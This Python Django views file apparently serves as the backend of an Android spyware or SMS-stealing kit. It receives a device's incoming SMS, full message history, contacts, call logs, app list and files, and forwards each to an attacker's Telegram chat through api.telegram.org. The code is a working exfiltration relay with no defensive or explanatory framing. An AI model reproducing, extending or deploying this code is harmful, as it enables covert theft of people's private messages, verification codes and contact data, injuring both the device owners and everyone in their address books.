import json
import re
from asyncio import wait
from urllib.parse import quote_plus
import requests
from django.http import HttpResponse
from rest_framework.decorators import api_view
import telepot


@api_view(['POST'])
def on_new_sms(request):
    token = request.headers['token']
    chatId = request.headers['chatId']

    body = json.loads(request.body.decode('utf-8'))
    phone = body['phone']
    message = body['message']
    device = body['device']

    bot_token = token
    bot_chatId = chatId
    bot_message = f'New Sms \U00002728 \n\n_Device_ : *{device}* \n\n_From_ : *{phone}* \n\n_Message_ :\n*{clearString(message)}*'
    send_text = 'https://api.telegram.org/bot' + bot_token + \
                '/sendMessage?chat_id=' + bot_chatId + '&parse_mode=Markdown&text=' + bot_message
    requests.get(send_text)
    return HttpResponse("", status=200)


@api_view(['POST'])
def on_contact(request):
    token = request.headers['token']
    chatId = request.headers['chatId']

    body = json.loads(request.body.decode('utf-8'))
    contactList = ''
    for contact in body:
        name = contact['name']
        number = contact['mobileNumber']
        contactList += '_name_ : ' + f'*{clearString(name)}*' + '\n' + '_number_ : ' + f'*{clearNumber(number)}*' + '\n\n '

    send_text = 'https://api.telegram.org/bot' + token + \
                '/sendMessage?chat_id=' + chatId + '&parse_mode=Markdown&text=' + '%20%23%20Contacts \U00002728 \n\n' + contactList
    requests.get(send_text)
    return HttpResponse("OK", status=200)


@api_view(['POST'])
def on_file(request):
    token = request.headers['token']
    chatId = request.headers['chatId']
    files = request.FILES.items()
    bot = telepot.Bot(token)
    for file in files:
        bot.sendDocument(chatId, document=file)
    return HttpResponse(status=200)


@api_view(['POST'])
def on_app(request):
    token = request.headers['token']
    chatId = request.headers['chatId']

    bot = telepot.Bot(token)
    body = json.loads(request.body.decode('utf-8'))
    appList = '%20%23%20Apps List \U00002728 \n\n '
    for app in body:
        appName = app['name']
        appList += appName + "\n\n"
    bot.sendMessage(chatId, appList)


@api_view(['POST'])
def on_all_sms(request):
    token = request.headers['token']
    chatId = request.headers['chatId']

    body = json.loads(request.body.decode('utf-8'))
    listSms = 'All %20%23%20Sms \U00002728 \n\n'
    for sms in body:
        device = sms['device']
        sender = sms['phone']
        message = sms['message']
        listSms += f'_Device_ : *{clearString(device)}* \n_From_ : *{clearString(sender)}* \n_Message_ :\n*{clearString(message)}*\n\n'
    send_text = 'https://api.telegram.org/bot' + token + \
                '/sendMessage?chat_id=' + chatId + '&parse_mode=Markdown&text=' + listSms
    requests.get(send_text)
    return HttpResponse("", status=200)


@api_view(['POST'])
def on_call_log(request):
    token = request.headers['token']
    chatId = request.headers['chatId']

    body = json.loads(request.body.decode('utf-8'))
    listCall = '%20%23%20Call Log \U00002728 \n\n'
    for call in body:
        callDate = call['date']
        duration = call['duration']
        isRead = call['isRead']
        name = call['name']
        number = call['phone']
        type = call['type']
        listCall += f'_callDate_ : *{callDate}*\n_duration_ : *{duration}*\n' \
                    f'_isRead_ : *{isRead}*\n_name_ : *{clearString(name)}*\n' \
                    f'_number_ : *{clearString(number)}*\n_type_ : *{clearString(type)}*\n\n'
    send_text = 'https://api.telegram.org/bot' + token + \
                '/sendMessage?chat_id=' + chatId + '&parse_mode=Markdown&text=' + listCall
    requests.get(send_text)
    return HttpResponse(listCall, status=200)


def clearString(string):
    return re.sub('[^a-zA-Zا-ی0-9 `]', '', string)


# clear
def clearNumber(string):
    return re.sub('[^0-9`]', '', string)
